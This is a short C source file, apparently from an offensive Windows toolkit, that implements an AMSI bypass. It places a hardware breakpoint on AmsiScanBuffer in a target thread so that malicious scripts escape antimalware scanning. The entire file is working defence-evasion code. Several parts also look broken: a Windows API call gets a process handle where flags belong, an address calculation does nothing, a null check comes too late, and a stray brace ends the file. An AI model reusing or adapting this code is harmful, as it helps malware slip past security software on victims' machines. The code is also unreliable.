#include "AMSIBypass.h"



BOOL ApplyVehAmsiBypass(HANDLE hProcess, HANDLE hThread) {
    // resolving AmsiScanBuffer localy to get the offset for the HWBP
    // PS : modules are shared between processes, so the offset will be the same in the target process
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    PVOID* pAmsiScanBuffer = CustomGetProcAddress(hAmsi, "AmsiScanBuffer");

    GetModuleHandleExA(hProcess, "amsi.dll", &hAmsi);

    PVOID pabsAmsiScanBuffer = (PBYTE)hAmsi + ((PBYTE)pAmsiScanBuffer - (PBYTE)hAmsi);
    printf("[*] AmsiScanBuffer found at : 0x%p\n", pabsAmsiScanBuffer);

    if (!pAmsiScanBuffer) return FALSE;;

    // Setting up the HWBP on AmsiScanBuffer
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] GetThreadContext Failed : %u\n", GetLastError());
        return FALSE;
    }

    ctx.Dr0 = (DWORD64)pabsAmsiScanBuffer;
    ctx.Dr7 = 0x1;
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] SetThreadContext Failed : %u\n", GetLastError());
        return FALSE;
    }
    

    return TRUE;
}





}